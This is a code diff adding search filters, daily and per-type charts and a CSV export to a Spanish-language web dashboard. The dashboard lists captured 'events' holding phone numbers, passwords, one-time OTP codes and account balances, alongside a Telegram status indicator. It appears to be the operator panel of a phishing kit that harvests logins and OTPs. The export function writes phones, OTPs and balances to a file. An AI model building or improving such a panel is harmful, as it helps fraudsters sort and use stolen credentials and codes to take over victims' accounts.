@@ -199,6 +199,120 @@
             margin: 20px 0;
         }
         
+        .filters {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .filter-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .filter-group label {
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .filter-group input,
+        .filter-group select {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s ease;
+        }
+        
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #5a6fd8;
+        }
+        
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #218838;
+        }
+        
+        .btn-warning {
+            background: #ffc107;
+            color: #212529;
+        }
+        
+        .btn-warning:hover {
+            background: #e0a800;
+        }
+        
+        .chart-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .chart-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .chart-bar {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .chart-label {
+            width: 100px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .chart-bar-fill {
+            height: 20px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 10px;
+            margin-left: 10px;
+            transition: width 0.5s ease;
+        }
+        
+        .chart-value {
+            margin-left: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+        
         @media (max-width: 768px) {
             .header h1 {
                 font-size: 2rem;
@@ -210,6 +324,14 @@
             
             .endpoints {
                 grid-template-columns: 1fr;
+            }
+            
+            .filters {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                justify-content: center;
             }
         }
     </style>
@@ -262,24 +384,70 @@
         
         <div class="section">
             <h2>📊 Eventos Recientes</h2>
-            <button class="refresh-btn" onclick="loadEvents()">🔄 Actualizar</button>
+            
+            <div class="filters">
+                <div class="filter-group">
+                    <label for="phoneSearch">🔍 Buscar por Teléfono:</label>
+                    <input type="text" id="phoneSearch" placeholder="Ingrese número de teléfono" onkeyup="filterEvents()">
+                </div>
+                <div class="filter-group">
+                    <label for="dateFrom">📅 Fecha Desde:</label>
+                    <input type="date" id="dateFrom" onchange="filterEvents()">
+                </div>
+                <div class="filter-group">
+                    <label for="dateTo">📅 Fecha Hasta:</label>
+                    <input type="date" id="dateTo" onchange="filterEvents()">
+                </div>
+                <div class="filter-group">
+                    <label for="eventType">📋 Tipo de Evento:</label>
+                    <select id="eventType" onchange="filterEvents()">
+                        <option value="">Todos los eventos</option>
+                        <option value="login">Login</option>
+                        <option value="otp">OTP</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" onclick="loadEvents()">🔄 Actualizar</button>
+                <button class="btn btn-success" onclick="exportToExcel()">📊 Exportar a Excel</button>
+                <button class="btn btn-warning" onclick="clearFilters()">🗑️ Limpiar Filtros</button>
+            </div>
+            
             <div id="eventsContainer">
                 <div class="loading">Cargando eventos...</div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>📈 Estadísticas y Gráficos</h2>
+            <div class="chart-container">
+                <div class="chart-title">Eventos por Día (Últimos 7 días)</div>
+                <div id="dailyChart"></div>
+            </div>
+            <div class="chart-container">
+                <div class="chart-title">Distribución por Tipo de Evento</div>
+                <div id="typeChart"></div>
             </div>
         </div>
     </div>
 
     <script>
+        let allEvents = [];
+        let filteredEvents = [];
+        
         async function loadEvents() {
             const container = document.getElementById('eventsContainer');
             container.innerHTML = '<div class="loading">Cargando eventos...</div>';
             
             try {
                 const response = await fetch('/api/events');
-                const events = await response.json();
+                allEvents = await response.json();
+                filteredEvents = [...allEvents];
                 
-                updateStats(events);
-                displayEvents(events);
+                updateStats(allEvents);
+                displayEvents(filteredEvents);
+                updateCharts(allEvents);
                 
             } catch (error) {
                 container.innerHTML = '<div class="error">Error al cargar eventos: ' + error.message + '</div>';
@@ -298,11 +466,54 @@
             telegramStatus.textContent = '🟢'; // Por defecto asumimos que está conectado
         }
         
+        function filterEvents() {
+            const phoneSearch = document.getElementById('phoneSearch').value.toLowerCase();
+            const dateFrom = document.getElementById('dateFrom').value;
+            const dateTo = document.getElementById('dateTo').value;
+            const eventType = document.getElementById('eventType').value;
+            
+            filteredEvents = allEvents.filter(event => {
+                // Filtro por teléfono
+                if (phoneSearch && !event.phone?.toLowerCase().includes(phoneSearch)) {
+                    return false;
+                }
+                
+                // Filtro por fecha desde
+                if (dateFrom && event.created_at < dateFrom + 'T00:00:00') {
+                    return false;
+                }
+                
+                // Filtro por fecha hasta
+                if (dateTo && event.created_at > dateTo + 'T23:59:59') {
+                    return false;
+                }
+                
+                // Filtro por tipo de evento
+                if (eventType) {
+                    if (eventType === 'login' && !event.password) return false;
+                    if (eventType === 'otp' && !event.otp) return false;
+                }
+                
+                return true;
+            });
+            
+            displayEvents(filteredEvents);
+            updateStats(filteredEvents);
+        }
+        
+        function clearFilters() {
+            document.getElementById('phoneSearch').value = '';
+            document.getElementById('dateFrom').value = '';
+            document.getElementById('dateTo').value = '';
+            document.getElementById('eventType').value = '';
+            filterEvents();
+        }
+        
         function displayEvents(events) {
             const container = document.getElementById('eventsContainer');
             
             if (events.length === 0) {
-                container.innerHTML = '<div class="loading">No hay eventos registrados aún</div>';
+                container.innerHTML = '<div class="loading">No hay eventos que coincidan con los filtros</div>';
                 return;
             }
             
@@ -328,6 +539,102 @@
             }
             
             container.innerHTML = html;
+        }
+        
+        function updateCharts(events) {
+            updateDailyChart(events);
+            updateTypeChart(events);
+        }
+        
+        function updateDailyChart(events) {
+            const dailyData = {};
+            const today = new Date();
+            
+            // Inicializar últimos 7 días
+            for (let i = 6; i >= 0; i--) {
+                const date = new Date(today);
+                date.setDate(date.getDate() - i);
+                const dateStr = date.toISOString().split('T')[0];
+                dailyData[dateStr] = 0;
+            }
+            
+            // Contar eventos por día
+            events.forEach(event => {
+                const eventDate = event.created_at.split('T')[0];
+                if (dailyData.hasOwnProperty(eventDate)) {
+                    dailyData[eventDate]++;
+                }
+            });
+            
+            // Crear gráfico
+            const maxValue = Math.max(...Object.values(dailyData), 1);
+            let chartHtml = '';
+            
+            Object.entries(dailyData).forEach(([date, count]) => {
+                const percentage = (count / maxValue) * 100;
+                const displayDate = new Date(date).toLocaleDateString('es-ES', { weekday: 'short', day: 'numeric' });
+                
+                chartHtml += '<div class="chart-bar">';
+                chartHtml += '<div class="chart-label">' + displayDate + '</div>';
+                chartHtml += '<div class="chart-bar-fill" style="width: ' + percentage + '%;"></div>';
+                chartHtml += '<div class="chart-value">' + count + '</div>';
+                chartHtml += '</div>';
+            });
+            
+            document.getElementById('dailyChart').innerHTML = chartHtml;
+        }
+        
+        function updateTypeChart(events) {
+            const typeData = {
+                'Login': events.filter(e => e.password && !e.otp).length,
+                'OTP': events.filter(e => e.otp).length,
+                'Login + OTP': events.filter(e => e.password && e.otp).length
+            };
+            
+            const maxValue = Math.max(...Object.values(typeData), 1);
+            let chartHtml = '';
+            
+            Object.entries(typeData).forEach(([type, count]) => {
+                const percentage = (count / maxValue) * 100;
+                
+                chartHtml += '<div class="chart-bar">';
+                chartHtml += '<div class="chart-label">' + type + '</div>';
+                chartHtml += '<div class="chart-bar-fill" style="width: ' + percentage + '%;"></div>';
+                chartHtml += '<div class="chart-value">' + count + '</div>';
+                chartHtml += '</div>';
+            });
+            
+            document.getElementById('typeChart').innerHTML = chartHtml;
+        }
+        
+        function exportToExcel() {
+            if (filteredEvents.length === 0) {
+                alert('No hay eventos para exportar');
+                return;
+            }
+            
+            let csvContent = 'ID,Teléfono,Contraseña,OTP,Saldo,Fecha\n';
+            
+            filteredEvents.forEach(event => {
+                csvContent += [
+                    event.id,
+                    event.phone || '',
+                    event.password ? 'SI' : 'NO',
+                    event.otp || '',
+                    event.saldo || '',
+                    new Date(event.created_at).toLocaleString('es-ES')
+                ].join(',') + '\n';
+            });
+            
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            const url = URL.createObjectURL(blob);
+            link.setAttribute('href', url);
+            link.setAttribute('download', 'eventos_' + new Date().toISOString().split('T')[0] + '.csv');
+            link.style.visibility = 'hidden';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
         }
         
         // Cargar eventos al iniciar
